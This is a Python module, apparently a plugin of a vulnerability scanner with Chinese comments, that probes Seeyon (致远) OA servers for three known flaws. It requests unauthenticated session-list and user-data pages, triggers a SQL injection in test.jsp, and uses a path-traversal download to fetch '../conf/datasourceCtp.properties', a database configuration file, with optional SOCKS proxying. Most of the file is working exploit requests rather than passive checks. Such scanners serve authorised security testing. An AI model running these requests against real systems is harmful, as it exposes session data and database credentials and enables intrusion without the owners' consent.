from termcolor import cprint
import requests
import threading
import re
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# 模板
class Detect(threading.Thread):
    name = '致远'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url.rstrip('/')
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):
        # 漏洞1

        # 致远OA Session泄漏漏洞
        self.getSession()

        # 致远OA A6 test.jsp sql注入漏洞
        self.testSQL()

        # 致远OA A6-V5 任意文件下载漏洞
        self.downloadFile()

        if not self.isExist:
            return False
        else:
            return True



    # 致远OA Session泄漏漏洞
    def getSession(self):
        sessionUrl1 = self.url + '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
        sessionUrl2 = self.url + '/yyoa/assess/js/initDataAssess.jsp'
        sessionUrl3 = self.url + '/yyoa/common/selectPersonNew/initData.jsp?trueName=1'
        try:
            res1 = requests.get(url=sessionUrl1, headers=self.headers, proxies=self.proxies, verify=False)
            res2 = requests.get(url=sessionUrl2, headers=self.headers, proxies=self.proxies, verify=False)
            res3 = requests.get(url=sessionUrl3, headers=self.headers, proxies=self.proxies, verify=False)
            if res1.status_code == 200 and len(res1.text) > 10:
                self.isExist = True
                tqdm.write(Fore.RED + '[致远OA 信息泄漏漏洞] {}'.format(sessionUrl1))
                self.vul_list.append(['致远OA 信息泄漏漏洞', self.url, 'Yes {}'.format(sessionUrl1)])
            if res2.status_code == 200 and len(res2.text) > 10:
                self.isExist = True
                tqdm.write(Fore.RED + '[致远OA 信息泄漏漏洞] {}'.format(sessionUrl2))
                self.vul_list.append(['致远OA 信息泄漏漏洞', self.url, 'Yes {}'.format(sessionUrl2)])
            if res3.status_code == 200 and len(res3.text) > 10:
                self.isExist = True
                tqdm.write(Fore.RED + '[致远OA 信息泄漏漏洞] {}'.format(sessionUrl3))
                self.vul_list.append(['致远OA 信息泄漏漏洞', self.url, 'Yes {}'.format(sessionUrl3)])
        except Exception as e:
            return False

    # 致远OA A6 test.jsp sql注入漏洞
    def testSQL(self):
        testSQL_url = self.url + '/yyoa/common/js/menu/test.jsp?doType=101&S1='
        try:
            res = requests.get(url=testSQL_url, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and 'java.sql.SQLException' in res.text:
                self.isExist = True
                tqdm.write(Fore.RED + '[致远OA test.jsp sql注入漏洞] {}'.format(testSQL_url))
                self.vul_list.append(['致远OA test.jsp sql注入漏洞', self.url, 'Yes {}'.format(testSQL_url)])
        except Exception as e:
            return False

    # 致远OA A6-V5 任意文件下载漏洞
    def downloadFile(self):
        downloadFile_url = self.url + '/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties'
        try:
            res = requests.get(url=downloadFile_url, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and 'DataSource' in res.text:
                self.isExist = True
                tqdm.write(Fore.RED + '[致远OA A6-V5 任意文件下载漏洞] {}'.format(downloadFile_url))
                self.vul_list.append(['致远OA A6-V5 任意文件下载漏洞', self.url, 'Yes {}'.format(downloadFile_url)])
        except Exception as e:
            return False


if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
